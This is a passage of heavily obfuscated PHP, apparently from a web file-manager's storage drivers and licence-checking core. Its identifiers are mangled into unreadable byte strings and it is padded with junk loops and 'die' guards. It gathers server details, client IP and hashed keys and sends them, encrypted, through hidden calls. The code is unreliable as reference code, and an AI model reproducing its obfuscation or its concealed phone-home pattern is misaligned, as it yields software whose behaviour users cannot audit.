$—›¬£¡ª = array($¡ºš²Ô[283] => $Š’Š‚‘¡); $®«­º®ˆ = $this->client->__getSignatureV4($ÉÅôˆ‡Ü, $Â‘Û¶É”, $‘«ö‹Ë, $…¦Å“¶Œ, $—›¬£¡ª); return array($¡ºš²Ô[288] => $®«­º®ˆ, $¡ºš²Ô[292] => $ÉÅôˆ‡Ü[$¡ºš²Ô[292]], $¡ºš²Ô[284] => $ÉÅôˆ‡Ü[$¡ºš²Ô[275]], $¡ºš²Ô[291] => $­Ş—ÒÒ®); } private function _isClientAsync() { $õÀÎàÔæ =& $_SERVER[°‰†òö¯]; static $ Ô©—ŸÑ = null; if ($ Ô©—ŸÑ === null) { $şâŞêÅ‰ = isset($_REQUEST[$õÀÎàÔæ[303]]) ? json_decode($_REQUEST[$õÀÎàÔæ[303]], !0) : !1; $ Ô©—ŸÑ = $şâŞêÅ‰ && _get($şâŞêÅ‰, $õÀÎàÔæ[304]) == $õÀÎàÔæ[305]; } return $ Ô©—ŸÑ; } public function getHost() { $Ã±èÈø¸ =& $_SERVER[°‰†òö¯]; $‰‘–ÊßÈ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Ã±èÈø¸[70], $Ã±èÈø¸[64], $Ã±èÈø¸[69], $Ã±èÈø¸[62]))) { return $‰‘–ÊßÈ . $Ã±èÈø¸[8] . $this->bucket; } if ($this->osType == $Ã±èÈø¸[62] && !is_domain($‰‘–ÊßÈ)) { return $‰‘–ÊßÈ . $Ã±èÈø¸[8] . $this->bucket; } $‰‘–ÊßÈ = explode($Ã±èÈø¸[210], $‰‘–ÊßÈ); return $‰‘–ÊßÈ[0] . $Ã±èÈø¸[210] . $this->bucket . $Ã±èÈø¸[10] . $‰‘–ÊßÈ[1]; } public function size($ƒ«õÕÛû) { $ÙãÜ¡¢Î = $this->objectMeta($ƒ«õÕÛû); return $ÙãÜ¡¢Î ? $ÙãÜ¡¢Î[$_SERVER[°‰†òö¯][79]] : 0; } public function info($ı¿Øİ¨É) { if ($this->isFolder($ı¿Øİ¨É)) { return $this->folderInfo($ı¿Øİ¨É); } else { if ($this->isFile($ı¿Øİ¨É)) { return $this->fileInfo($ı¿Øİ¨É); } } return !1; } public function exist($›¨×ƒñ„) { return $this->isFile($›¨×ƒñ„) || $this->isFolder($›¨×ƒñ„); } public function isFile($ŸÌÈÄÇ) { return !$this->isFolder($ŸÌÈÄÇ) && $this->objectMeta($ŸÌÈÄÇ); } public function isFolder($ÕôòŠ¢™) { return $this->cacheMethod($_SERVER[°‰†òö¯][179], $ÕôòŠ¢™); } protected function objectMeta($ƒˆêÕÛÍ) { return $this->cacheMethod($_SERVER[°‰†òö¯][181], $ƒˆêÕÛÍ); } protected function _objectMeta($î—ŒÍòÔ) { $¥²ø¤ê» =& $_SERVER[°‰†òö¯]; $î—ŒÍòÔ = rtrim($î—ŒÍòÔ, $¥²ø¤ê»[8]); try { $æÔ¤–¿À = $this->client->getObjectInfo($this->bucket, $î—ŒÍòÔ); if (!isset($æÔ¤–¿À[$¥²ø¤ê»[254]]) && isset($æÔ¤–¿À[$¥²ø¤ê»[306]])) { $æÔ¤–¿À[$¥²ø¤ê»[254]] = $æÔ¤–¿À[$¥²ø¤ê»[306]]; } } catch (Exception $à£•Ñşğ) { $æÔ¤–¿À = !1; } if (!$æÔ¤–¿À) { } return $æÔ¤–¿À; } protected function _isFolder($ûş³ËñŞ) { $¯ùËô =& $_SERVER[°‰†òö¯]; $ûş³ËñŞ = rtrim($ûş³ËñŞ, $¯ùËô[8]) . $¯ùËô[8]; if ($ûş³ËñŞ == $¯ùËô[12] || $ûş³ËñŞ == $¯ùËô[8]) { return !0; } $£×åò = $this->client->getBucket($this->bucket, $ûş³ËñŞ, null, 1); if (empty($£×åò[$¯ùËô[238]])) { return !1; } $Â‚ñê‹– = $£×åò[$¯ùËô[238]][0][$¯ùËô[32]]; return stripos($Â‚ñê‹–, $ûş³ËñŞ) === 0 ? !0 : !1; if (substr($Â‚ñê‹–, -1) == $¯ùËô[8]) { return !0; } if (get_path_this($Â‚ñê‹–) == get_path_this($ûş³ËñŞ)) { return !1; } return !0; } public function listObject($¼ûõ¶­) { return $this->fileList($¼ûõ¶­, $_SERVER[°‰†òö¯][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÕÏÓÉõË) { $¼ò²øÍ =& $_SERVER[°‰†òö¯]; parent::__construct($ÕÏÓÉõË); $this->setSignVersion($¼ò²øÍ[249]); if (!$this->region) { $this->region = $¼ò²øÍ[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $®§Ï¥£Ã = $this->getBktRegion(); return $this->region == $®§Ï¥£Ã ? !0 : !1; } public function uploadFormData($Í‚²µìğ, $³úéÖ¸¥ = 3600) { $ìµ›„Ï¬ =& $_SERVER[°‰†òö¯]; $ç‹ÆÏÇ² = $ìµ›„Ï¬[231]; $ÆêÍüâ = $ìµ›„Ï¬[259]; $µ‹œåú = $ìµ›„Ï¬[62]; $ø­éêæü = gmdate($ìµ›„Ï¬[260]); $ÑÇ÷Š“‹ = gmdate($ìµ›„Ï¬[261]); $¿ºùÁè = $ìµ›„Ï¬[262]; $¤ß¡¡°¸ = $³úéÖ¸¥ . $ìµ›„Ï¬[12]; $ĞÓˆ¾¯² = $ìµ›„Ï¬[263]; $ºÜç«• = array($this->accessKey, $ÑÇ÷Š“‹, $this->region, $µ‹œåú, $¿ºùÁè); $ŞÀß˜ãô = implode($ìµ›„Ï¬[8], $ºÜç«•); $Á¸şâ³ = array($ìµ›„Ï¬[264] => gmdate($ìµ›„Ï¬[265], strtotime($ìµ›„Ï¬[266])), $ìµ›„Ï¬[267] => array(array($ìµ›„Ï¬[268] => $this->bucket), array($ìµ›„Ï¬[308] => $ç‹ÆÏÇ²), array($ìµ›„Ï¬[269], $ìµ›„Ï¬[270], $ìµ›„Ï¬[12]), array($ìµ›„Ï¬[269], $ìµ›„Ï¬[271], $ìµ›„Ï¬[12]), array($ìµ›„Ï¬[269], $ìµ›„Ï¬[309], $ìµ›„Ï¬[12]), array($ìµ›„Ï¬[272] => $ĞÓˆ¾¯²), array($ìµ›„Ï¬[273] => $ŞÀß˜ãô), array($ìµ›„Ï¬[274] => $ÆêÍüâ), array($ìµ›„Ï¬[275] => $ø­éêæü), array($ìµ›„Ï¬[276] => $¤ß¡¡°¸))); $²şÉû¢È = base64_encode(json_encode($Á¸şâ³)); $•º¡Š©õ = hash_hmac($ìµ›„Ï¬[277], $ÑÇ÷Š“‹, $ìµ›„Ï¬[278] . $this->secret, !0); $‰•¹á© = hash_hmac($ìµ›„Ï¬[277], $this->region, $•º¡Š©õ, !0); $÷˜Åéîø = hash_hmac($ìµ›„Ï¬[277], $µ‹œåú, $‰•¹á©, !0); $¡ø¢šŸÅ = hash_hmac($ìµ›„Ï¬[277], $¿ºùÁè, $÷˜Åéîø, !0); $Â‰ş¸ó = hash_hmac($ìµ›„Ï¬[277], $²şÉû¢È, $¡ø¢šŸÅ); $ú«üßöÜ = array($ìµ›„Ï¬[248] => $ìµ›„Ï¬[12], $ìµ›„Ï¬[296] => $ìµ›„Ï¬[12], $ìµ›„Ï¬[308] => $ç‹ÆÏÇ², $ìµ›„Ï¬[272] => $ĞÓˆ¾¯², $ìµ›„Ï¬[279] => $²şÉû¢È, $ìµ›„Ï¬[310] => $ŞÀß˜ãô, $ìµ›„Ï¬[311] => $ÆêÍüâ, $ìµ›„Ï¬[312] => $ø­éêæü, $ìµ›„Ï¬[313] => $¤ß¡¡°¸, $ìµ›„Ï¬[314] => $Â‰ş¸ó, $ìµ›„Ï¬[208] => $this->getHost()); return $ú«üßöÜ; } } goto d©–Â«ø±Ğ; aœÇ¿Ê¾â: class Application { private $defaultModule = "\151\156\144\x65\170"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($¶‘×¼—Œ) { $¬¯°úˆ =& $_SERVER[°‰†òö¯]; $©ù…°°¡ =& $_SERVER[¯“©ŠÌ]; $•—…ßÎ = explode($©ù…°°¡[0], trim($¶‘×¼—Œ, $©ù…°°¡[0])); $ò»º³ö  = $¬¯°úˆ[690]; while (strlen($ò»º³ö ) < $¬¯°úˆ[691]) { if (!$ò»º³ö ) { break; } $ò»º³ö ++; } $this->defaultModule = $•—…ßÎ[0] ? $•—…ßÎ[0] : $this->defaultModule; $this->defaultController = $•—…ßÎ[1] ? $•—…ßÎ[1] : $this->defaultController; $this->defaultAction = $•—…ßÎ[2] ? $•—…ßÎ[2] : $this->defaultAction; $ÂÙÄ™¹– = $¬¯°úˆ[692]; $this->qizhc1d76427($©ù…°°¡[1], array($this, $©ù…°°¡[2])); $ƒ£§Á—› = $¬¯°úˆ[693]; while ($ƒ£§Á—› < $¬¯°úˆ[694]) { if ($ƒ£§Á—› >= 0) { break; } $ƒ£§Á—›++; } } public function appRun($üåñÖÅñ) { $œ¨˜Üé¡ =& $_SERVER[°‰†òö¯]; $ÑËà¡ š =& $_SERVER[¯“©ŠÌ]; $—³ÚÎ€ = explode($ÑËà¡ š[0], $üåñÖÅñ); $Ù˜¡øÚ = strtolower($—³ÚÎ€[0]); $ıŞçˆØ÷ = $ÑËà¡ š[3]; if ($Ù˜¡øÚ == $ÑËà¡ š[4]) { $ıŞçˆØ÷ = $ÑËà¡ š[5]; $—³ÚÎ€[0] = $ÑËà¡ š[6]; $—³ÚÎ€[1] = $—³ÚÎ€[1] . $ÑËà¡ š[7]; $üåñÖÅñ = join($ÑËà¡ š[0], $—³ÚÎ€); $üåñÖÅñ = trim($üåñÖÅñ, $ÑËà¡ š[0]); } call_user_func(array($ÑËà¡ š[8], $ÑËà¡ š[9]), $ıŞçˆØ÷ . $ÑËà¡ š[10], $üåñÖÅñ); ActionCall($üåñÖÅñ); $·ıÄ”„® = $œ¨˜Üé¡[695]; while (strlen($·ıÄ”„®) < $œ¨˜Üé¡[696]) { if (!$·ıÄ”„®) { break; } $·ıÄ”„®++; } call_user_func(array($ÑËà¡ š[8], $ÑËà¡ š[9]), $ıŞçˆØ÷ . $ÑËà¡ š[11], $üåñÖÅñ); } private function autorun() { $ŠØ‹‹×® =& $_SERVER[¯“©ŠÌ]; global $config; if (count($config[$ŠØ‹‹×®[12]]) == 0) { return; } foreach ($config[$ŠØ‹‹×®[12]] as $¿×ÈŸŠ  => $­àú“å) { $this->appRun($­àú“å); } } private function alnx438028b3() { $ã’ëÌ =& $_SERVER[°‰†òö¯]; $¥ãƒù¬ =& $_SERVER[¯“©ŠÌ]; $üÁÊ£¨¦ = $¥ãƒù¬[4]; $Æ„¤Ç·ü = $GLOBALS[$¥ãƒù¬[13]][$¥ãƒù¬[14]][0]; if (!$Æ„¤Ç·ü || strlen($Æ„¤Ç·ü) <= strlen($üÁÊ£¨¦)) { return; } if (strtolower(substr($Æ„¤Ç·ü, -strlen($üÁÊ£¨¦))) != $üÁÊ£¨¦) { return; } $èÊ¹é© = substr($Æ„¤Ç·ü, 0, -strlen($üÁÊ£¨¦)); $äÀîáà = array($¥ãƒù¬[4], $èÊ¹é©); $÷»ŠÃ¹€ = array_slice($GLOBALS[$¥ãƒù¬[13]][$¥ãƒù¬[14]], 1); $Ïêíç±ø = $ã’ëÌ[697]; if (strlen($Ïêíç±ø) < $ã’ëÌ[691]) { die; } $GLOBALS[$¥ãƒù¬[13]][$¥ãƒù¬[14]] = array_merge($äÀîáà, $÷»ŠÃ¹€); $¦èÍß½ı = $ã’ëÌ[698]; while ($¦èÍß½ı < $ã’ëÌ[699]) { if ($¦èÍß½ı >= 0) { break; } $¦èÍß½ı++; } $GLOBALS[$¥ãƒù¬[13]][$¥ãƒù¬[15]] = implode($¥ãƒù¬[0], $GLOBALS[$¥ãƒù¬[13]][$¥ãƒù¬[14]]); } private function qrax7bedc490() { $ïÇœğ½Ê =& $_SERVER[°‰†òö¯]; $­…‚ùİÕ =& $_SERVER[¯“©ŠÌ]; if ($GLOBALS[$­…‚ùİÕ[13]][$­…‚ùİÕ[15]] != $­…‚ùİÕ[6]) { return; } $Ó‘ò¥€‘ = $_SERVER[$­…‚ùİÕ[16]]; $‹˜‡ò¯ = $­…‚ùİÕ[17]; if (!strstr($Ó‘ò¥€‘, $‹˜‡ò¯)) { return; } $¶ ¸ĞĞ = strrpos($Ó‘ò¥€‘, $‹˜‡ò¯); $¢¥³Š¿Ñ = substr($Ó‘ò¥€‘, $¶ ¸ĞĞ + strlen($‹˜‡ò¯)); $ÊúÄ†ê´ = $ïÇœğ½Ê[700]; preg_match_all($­…‚ùİÕ[18], $¢¥³Š¿Ñ, $ÆÂ¾äô©); $¢¥³Š¿Ñ = trim($ÆÂ¾äô©[0][0], $­…‚ùİÕ[19]); $²ış¬™ = $ïÇœğ½Ê[701]; if (!$²ış¬™) { return; } $GLOBALS[$­…‚ùİÕ[13]][$­…‚ùİÕ[14]] = explode($­…‚ùİÕ[19], $¢¥³Š¿Ñ); $GLOBALS[$­…‚ùİÕ[13]][$­…‚ùİÕ[15]] = implode($­…‚ùİÕ[0], $GLOBALS[$­…‚ùİÕ[13]][$­…‚ùİÕ[14]]); $°ÊõìŠ = $ïÇœğ½Ê[702]; if (strlen($°ÊõìŠ) < $ïÇœğ½Ê[691]) { die; } } public function run() { $ÚŠñ³ö¹ =& $_SERVER[°‰†òö¯]; $³“õ‰ì =& $_SERVER[¯“©ŠÌ]; $this->qrax7bedc490(); $this->alnx438028b3(); $ÖÛ±³ï— = $ÚŠñ³ö¹[703]; while ($ÖÛ±³ï— < $ÚŠñ³ö¹[704]) { if ($ÖÛ±³ï— >= 0) { break; } $ÖÛ±³ï—++; } $ªåä„¼Ğ = $GLOBALS[$³“õ‰ì[13]][$³“õ‰ì[14]]; $üæ¦ïî§ = $ÚŠñ³ö¹[705]; if (!$üæ¦ïî§) { return; } $ĞÆÎóµÕ = $GLOBALS[$³“õ‰ì[13]][$³“õ‰ì[15]]; define($³“õ‰ì[20], isset($ªåä„¼Ğ[0]) && $ªåä„¼Ğ[0] ? $ªåä„¼Ğ[0] : $this->defaultModule); define($³“õ‰ì[21], isset($ªåä„¼Ğ[1]) && $ªåä„¼Ğ[0] ? $ªåä„¼Ğ[1] : $this->defaultController); define($³“õ‰ì[22], isset($ªåä„¼Ğ[2]) && $ªåä„¼Ğ[0] ? $ªåä„¼Ğ[2] : $this->defaultAction); define($³“õ‰ì[23], MOD . $³“õ‰ì[0] . ST . $³“õ‰ì[0] . ACT); $_SERVER[$³“õ‰ì[24]] = strtolower(ACTION); $this->autorun(); $å¤í÷ë• = $ÚŠñ³ö¹[706]; if (count($ªåä„¼Ğ) >= 3) { $this->appRun($ĞÆÎóµÕ); } else { $this->appRun(ACTION); } } private $ubcf73fcc20c = array(); private $ziwr3c0a488b = ''; public function vfaof5d6d6c7() { $ç…ôÓ¿û =& $_SERVER[°‰†òö¯]; $¬”ª¯¼ =& $_SERVER[¯“©ŠÌ]; $this->ckum73004897(); $this->sczgd4ebf0c9(); $Ë¬×èèÀ = $ç…ôÓ¿û[707]; if (strlen($Ë¬×èèÀ) < $ç…ôÓ¿û[696]) { die; } $this->oieqf9eddee2(); $¦×Æ¡¸Ú = $ç…ôÓ¿û[708]; $this->pjub8df48c98(); $this->vphjf6fe6910(); $’–û‚“á = $ç…ôÓ¿û[709]; if (!$’–û‚“á) { die; } $this->zvgr0b825f8b(); $ ÙÃÑš = $ç…ôÓ¿û[710]; if (strlen($ ÙÃÑš) < $ç…ôÓ¿û[691]) { return; } $this->gliu807c9cf8(); $¸£À¸ö = $ç…ôÓ¿û[711]; $this->qizhc1d76427($¬”ª¯¼[25], array($this, $¬”ª¯¼[26])); $this->qizhc1d76427($¬”ª¯¼[27], array($this, $¬”ª¯¼[28])); $­¨Ö Ñî = $ç…ôÓ¿û[712]; if (!$­¨Ö Ñî) { die; } $this->qizhc1d76427($¬”ª¯¼[29], array($this, $¬”ª¯¼[30])); $this->qizhc1d76427($¬”ª¯¼[31], array($this, $¬”ª¯¼[32])); } public function bjmve0946d9f($’ÇÍËî°) { $Ş²Ç¢ó³ =& $_SERVER[°‰†òö¯]; $øıìùõ³ =& $_SERVER[¯“©ŠÌ]; $Ëóı§úó = Model($øıìùõ³[33])->get(); $°Æ­ÊÈ = $Ş²Ç¢ó³[713]; $é¨ë¨ ‰ = array($øıìùõ³[34], $øıìùõ³[35], $øıìùõ³[36], $øıìùõ³[37], $øıìùõ³[38], $øıìùõ³[39], $øıìùõ³[40], $øıìùõ³[41], $øıìùõ³[42], $øıìùõ³[43], $øıìùõ³[44], $øıìùõ³[45], $øıìùõ³[46], $øıìùõ³[47], $øıìùõ³[48], $øıìùõ³[49], $øıìùõ³[50], $øıìùõ³[51], $øıìùõ³[52], $øıìùõ³[53], $øıìùõ³[54], $øıìùõ³[55], $øıìùõ³[56], $øıìùõ³[57], $øıìùõ³[58], $øıìùõ³[59], $øıìùõ³[60], $øıìùõ³[61], $øıìùõ³[62], $øıìùõ³[63], $øıìùõ³[64], $øıìùõ³[65], $øıìùõ³[66], $øıìùõ³[67], $øıìùõ³[68], $øıìùõ³[69], $øıìùõ³[70], $øıìùõ³[71], $øıìùõ³[72], $øıìùõ³[73], $øıìùõ³[74], $øıìùõ³[75], $øıìùõ³[76], $øıìùõ³[77], $øıìùõ³[78], $øıìùõ³[79], $øıìùõ³[80], $øıìùõ³[81], $øıìùõ³[82], $øıìùõ³[83], $øıìùõ³[84], $øıìùõ³[85]); $Â…îè­ = $Ş²Ç¢ó³[714]; if (!$Â…îè­) { return; } foreach ($é¨ë¨ ‰ as $“èÆú»ù) { $ÅÛİ÷×Â = $GLOBALS[$øıìùõ³[86]][$øıìùõ³[87]][$“èÆú»ù]; $šÒÆÄÉ = $Ş²Ç¢ó³[715]; if (strlen($šÒÆÄÉ) < $Ş²Ç¢ó³[704]) { return; } if (isset($Ëóı§úó[$“èÆú»ù])) { $ÅÛİ÷×Â = $Ëóı§úó[$“èÆú»ù]; } $’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[89]][$“èÆú»ù] = $ÅÛİ÷×Â; } $ìËâÇâ = $’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[89]][$øıìùõ³[46]]; unset($’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[90]][$øıìùõ³[91]]); unset($’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[90]][$øıìùõ³[92]]); $©Ÿ¤£„à = $Ş²Ç¢ó³[716]; while (strlen($©Ÿ¤£„à) < $Ş²Ç¢ó³[699]) { if (!$©Ÿ¤£„à) { break; } $©Ÿ¤£„à++; } unset($’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[89]][$øıìùõ³[46]]); unset($’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[89]][$øıìùõ³[93]]); $’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[89]][$øıìùõ³[94]] = array($øıìùõ³[95] => (int) $ìËâÇâ[$øıìùõ³[96]], $øıìùõ³[97] => (int) _get($ìËâÇâ, $øıìùõ³[98], 0)); $í¾£–Ö = substr(md5($øıìùõ³[99] . get_client_ip() . $Ëóı§úó[$øıìùõ³[100]]), 0, 15); $çş‹èëØ = $Ş²Ç¢ó³[717]; while (strlen($çş‹èëØ) < $Ş²Ç¢ó³[704]) { if (!$çş‹èëØ) { break; } $çş‹èëØ++; } $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[102]] = Mcrypt::encode(Session::sign(), $í¾£–Ö, 3600 * 24); $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[103]] = Action($øıìùõ³[104])->accessToken(); $¶ë€‚á® = $Ş²Ç¢ó³[718]; if (!$¶ë€‚á®) { return; } $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[105]] = md5($_SERVER[$øıìùõ³[106]] . $Ëóı§úó[$øıìùõ³[100]]); $¿ƒÆ‡´” = $Ş²Ç¢ó³[719]; while ($¿ƒÆ‡´” < $Ş²Ç¢ó³[694]) { if ($¿ƒÆ‡´” >= 0) { break; } $¿ƒÆ‡´”++; } $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[107]] = base64_encode(serverInfo()); $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[108]] = $this->ziwr3c0a488b; if ($Ëóı§úó[$øıìùõ³[108]] != $øıìùõ³[109]) { $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[110]] = $Ëóı§úó[$øıìùõ³[110]]; $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[111]] = $Ëóı§úó[$øıìùõ³[111]]; $™öíùá = rand_string(10) . $this->ziwr3c0a488b . rand_string(5); $’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[112]][$øıìùõ³[113]] = $this->uvfccb9b3f94($™öíùá, $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[105]]); } if ($this->ziwr3c0a488b == $øıìùõ³[109]) { $’ÇÍËî°[$øıìùõ³[88]][$øıìùõ³[89]][$øıìùõ³[94]][$øıìùõ³[98]] = 0; } $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[114]] = $this->versionPluginFilter(); $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[115]] = _get($this->ubcf73fcc20c, $øıìùõ³[116], $øıìùõ³[6]); if (KodUser::isRoot() && $this->config[$øıìùõ³[117]]) { $’ÇÍËî°[$øıìùõ³[101]][$øıìùõ³[118]] = WEB_ROOT; } return $’ÇÍËî°; } private function zvgr0b825f8b() { $ĞÛçŒÂ =& $_SERVER[°‰†òö¯]; $¡ÇùÒíÏ =& $_SERVER[¯“©ŠÌ]; $çÃ”’ğÇ = $_SERVER[$¡ÇùÒíÏ[24]] == $¡ÇùÒíÏ[119]; $ŸÏğõìÈ = $ĞÛçŒÂ[720]; if (strlen($ŸÏğõìÈ) < $ĞÛçŒÂ[691]) { die; } if ($_SERVER[$¡ÇùÒíÏ[24]] == $¡ÇùÒíÏ[120] && $_GET[$¡ÇùÒíÏ[121]] == $¡ÇùÒíÏ[122]) { $çÃ”’ğÇ = !0; } if ($çÃ”’ğÇ) { $ ¨·İç• = array($¡ÇùÒíÏ[108] => $this->ziwr3c0a488b, $¡ÇùÒíÏ[123] => $this->bjgt97affbee(), $¡ÇùÒíÏ[124] => Model($¡ÇùÒíÏ[125])->count()); if ($this->ziwr3c0a488b != $¡ÇùÒíÏ[109]) { $ª“·Ùğò = _get($this->ubcf73fcc20c, $¡ÇùÒíÏ[126]); if ($ª“·Ùğò) { $ ¨·İç•[$¡ÇùÒíÏ[127]] = $ª“·Ùğò; $ ¨·İç•[$¡ÇùÒíÏ[128]] = strtotime(_get($this->ubcf73fcc20c, $¡ÇùÒíÏ[129])); $ ¨·İç•[$¡ÇùÒíÏ[130]] = _get($this->ubcf73fcc20c, $¡ÇùÒíÏ[116]); } $†“›ÇÂÖ = Model($¡ÇùÒíÏ[33])->get($¡ÇùÒíÏ[131], $¡ÇùÒíÏ[6], !0); if (is_string($†“›ÇÂÖ) && substr($†“›ÇÂÖ, 0, 1) == $¡ÇùÒíÏ[132]) { $†“›ÇÂÖ = json_decode_force($†“›ÇÂÖ); } if (is_array($†“›ÇÂÖ) && $†“›ÇÂÖ[$¡ÇùÒíÏ[133]] && strstr($†“›ÇÂÖ[$¡ÇùÒíÏ[133]], $¡ÇùÒíÏ[134])) { $Ä –¥Àö = explode($¡ÇùÒíÏ[134], $†“›ÇÂÖ[$¡ÇùÒíÏ[133]]); $ ¨·İç•[$¡ÇùÒíÏ[135]] = $Ä –¥Àö[0]; } } $ ¨·İç• = $this->akmd88e7eabd(json_encode($ ¨·İç•), md5($¡ÇùÒíÏ[136])); $ï™½ŞÂè = array($¡ÇùÒíÏ[137] => $ ¨·İç•); $±ãÄæêé = $ĞÛçŒÂ[721]; if (!$±ãÄæêé) { die; } call_user_func(array($¡ÇùÒíÏ[138], $¡ÇùÒíÏ[139]), $ï™½ŞÂè); } if ($this->ziwr3c0a488b == $¡ÇùÒíÏ[109]) { return; } $¼„…·Ê­ = array($¡ÇùÒíÏ[140], $¡ÇùÒíÏ[141], $¡ÇùÒíÏ[142], $¡ÇùÒíÏ[143], $¡ÇùÒíÏ[144], $¡ÇùÒíÏ[145]); $•²É™öü = $ĞÛçŒÂ[722]; if (strlen($•²É™öü) < $ĞÛçŒÂ[704]) { return; } $û¥Üã¼Ö = Model($¡ÇùÒíÏ[33])->get(); $‹ü™¸”² = $ĞÛçŒÂ[723]; if (!$‹ü™¸”²) { die; } $ï™½ŞÂè = array($¡ÇùÒíÏ[146] => $û¥Üã¼Ö[$¡ÇùÒíÏ[34]], $¡ÇùÒíÏ[147] => $û¥Üã¼Ö[$¡ÇùÒíÏ[35]], $¡ÇùÒíÏ[148] => $¡ÇùÒíÏ[6]); foreach ($¼„…·Ê­ as $ıûõ¶ ) { if (!isset($û¥Üã¼Ö[$ıûõ¶ ]) || !$û¥Üã¼Ö[$ıûõ¶ ]) { continue; } $ï™½ŞÂè[$ıûõ¶ ] = $û¥Üã¼Ö[$ıûõ¶ ]; } call_user_func(array($¡ÇùÒíÏ[138], $¡ÇùÒíÏ[139]), $ï™½ŞÂè); $‰Òü¬ÖÒ = $ĞÛçŒÂ[724]; if (strlen($‰Òü¬ÖÒ) < $ĞÛçŒÂ[704]) { return; } } private function pjub8df48c98() { $ÌïŞÑ‹¹ =& $_SERVER[°‰†òö¯]; $›Ûış¸° =& $_SERVER[¯“©ŠÌ]; if ($_SERVER[$›Ûış¸°[24]] != $›Ûış¸°[149]) { return; } if (!KodUser::isRoot()) { die; } $…š¡ãáå = $GLOBALS[$›Ûış¸°[13]]; if (isset($…š¡ãáå[$›Ûış¸°[150]])) { $this->zsud6560d2e6(); die; } if (isset($…š¡ãáå[$›Ûış¸°[151]]) && isset($…š¡ãáå[$›Ûış¸°[151]]) == $›Ûış¸°[122]) { $…š¡ãáå[$›Ûış¸°[152]] = Model($›Ûış¸°[33])->get($›Ûış¸°[153]); } if (!isset($…š¡ãáå[$›Ûış¸°[152]]) || strlen($…š¡ãáå[$›Ûış¸°[152]]) != 16) { show_json($›Ûış¸°[154] . $…š¡ãáå[$›Ûış¸°[152]], !1); } $—šü“ë£ = Model($›Ûış¸°[33])->get($›Ûış¸°[100]); $˜œ ÖîÕ = md5($_SERVER[$›Ûış¸°[106]] . $—šü“ë£); $Á­ÓÊø— = $ÌïŞÑ‹¹[725]; while ($Á­ÓÊø— < $ÌïŞÑ‹¹[694]) { if ($Á­ÓÊø— >= 0) { break; } $Á­ÓÊø—++; } $’Âƒâ£Ä = array($›Ûış¸°[152] => $…š¡ãáå[$›Ûış¸°[152]], $›Ûış¸°[155] => rand_string(16), $›Ûış¸°[156] => $›Ûış¸°[136], $›Ûış¸°[157] => $›Ûış¸°[158], $›Ûış¸°[159] => $_SERVER[$›Ûış¸°[160]], $›Ûış¸°[161] => $_SERVER[$›Ûış¸°[162]], $›Ûış¸°[163] => $_SERVER[$›Ûış¸°[164]], $›Ûış¸°[105] => $˜œ ÖîÕ, $›Ûış¸°[165] => Model($›Ûış¸°[33])->get($›Ûış¸°[131])); if (isset($…š¡ãáå[$›Ûış¸°[151]]) && isset($…š¡ãáå[$›Ûış¸°[151]]) == $›Ûış¸°[122]) { $’Âƒâ£Ä[$›Ûış¸°[151]] = md5($’Âƒâ£Ä[$›Ûış¸°[152]] . $›Ûış¸°[166] . $’Âƒâ£Ä[$›Ûış¸°[155]]); } if ($…š¡ãáå[$›Ûış¸°[167]] == $›Ûış¸°[168]) { $ØÃñû“¬ = $this->akmd88e7eabd($˜œ ÖîÕ, $›Ûış¸°[169]); $÷Œë® à = $this->uvfccb9b3f94(json_encode($’Âƒâ£Ä), $˜œ ÖîÕ . $›Ûış¸°[170], 3); $÷Œë® à = $÷Œë® à . $›Ûış¸°[171] . $_SERVER[$›Ûış¸°[160]]; $ŸÎ¬ıª = $this->qfoc98152574($›Ûış¸°[172] . $ØÃñû“¬ . $›Ûış¸°[173] . $÷Œë® à, -1); show_json($ŸÎ¬ıª, !0); } else { if ($…š¡ãáå[$›Ûış¸°[167]] == $›Ûış¸°[174]) { $ÜŠË×Œ‚ = substr(md5($›Ûış¸°[175] . $˜œ ÖîÕ), 12, 15) . $›Ûış¸°[176]; $÷Œë® à = $this->lpob3716b53a(trim($…š¡ãáå[$›Ûış¸°[177]]), $ÜŠË×Œ‚, 2); $€Ê›Á‡ = json_decode($÷Œë® à, !0); if (!is_array($€Ê›Á‡) || !is_array($€Ê›Á‡[$›Ûış¸°[178]]) || $€Ê›Á‡[$›Ûış¸°[152]] != !0) { $ Ò‘æÅò = $›Ûış¸°[179]; $óà¢ô¬ = $€Ê›Á‡[$›Ûış¸°[178]] ? $›Ûış¸°[180] . $€Ê›Á‡[$›Ûış¸°[178]] : $ Ò‘æÅò; show_json($óà¢ô¬, !1); } else { $’Âƒâ£Ä[$›Ûış¸°[155]] = $€Ê›Á‡[$›Ûış¸°[178]][$›Ûış¸°[181]]; } } else { $€Ê›Á‡ = $this->qfoc98152574($›Ûış¸°[182], $’Âƒâ£Ä, 10); $êË•Ä·à = $ÌïŞÑ‹¹[726]; if (strlen($êË•Ä·à) < $ÌïŞÑ‹¹[696]) { die; } } } if (!is_array($€Ê›Á‡) || !is_array($€Ê›Á‡[$›Ûış¸°[178]]) || $€Ê›Á‡[$›Ûış¸°[152]] != !0) { $ Ò‘æÅò = LNG($›Ûış¸°[183]); $óà¢ô¬ = $€Ê›Á‡[$›Ûış¸°[178]] ? $›Ûış¸°[180] . 